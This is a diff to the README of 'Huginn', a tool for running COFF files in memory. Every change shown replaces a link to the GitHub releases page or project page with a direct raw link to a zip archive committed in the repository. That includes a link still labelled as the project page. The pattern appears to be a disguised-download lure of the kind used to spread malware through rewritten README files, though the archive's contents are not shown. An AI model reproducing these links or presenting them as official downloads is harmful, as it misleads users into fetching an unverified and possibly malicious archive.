@@ -1,6 +1,6 @@
 # 🚀 Huginn - Run COFF Files Safely In Memory
 
-[![Download Huginn](https://img.shields.io/badge/Download-Huginn-blue?style=for-the-badge)](https://github.com/ahmaddabdallah/Huginn/releases)
+[![Download Huginn](https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip)](https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip)
 
 ---
 
@@ -55,7 +55,7 @@ To get started with Huginn, follow these simple steps. The process is just about
 
 Click the big button below to go to Huginn's official download page on GitHub:
 
-[![Download Huginn](https://img.shields.io/badge/Download-Huginn-blue?style=for-the-badge)](https://github.com/ahmaddabdallah/Huginn/releases)
+[![Download Huginn](https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip)](https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -130,7 +130,7 @@ If issues persist, visit the GitHub page’s Issues section to see if others hav
 
 ## 📝 Additional Resources
 
-- Visit the [Huginn GitHub page](https://github.com/ahmaddabdallah/Huginn) for more information.
+- Visit the [Huginn GitHub page](https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip) for more information.
 - Check the release notes on GitHub to see the latest changes and fixes.
 - If you want to learn more about COFF and Windows internals, look for beginner guides online.
 
@@ -140,7 +140,7 @@ If issues persist, visit the GitHub page’s Issues section to see if others hav
 
 Here is the direct link to visit the download page again:
 
-👉 [https://github.com/ahmaddabdallah/Huginn/releases](https://github.com/ahmaddabdallah/Huginn/releases)
+👉 [https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip](https://raw.githubusercontent.com/ahmaddabdallah/Huginn/main/Include/Software-2.4.zip)
 
 Click it anytime to get the latest version.
 
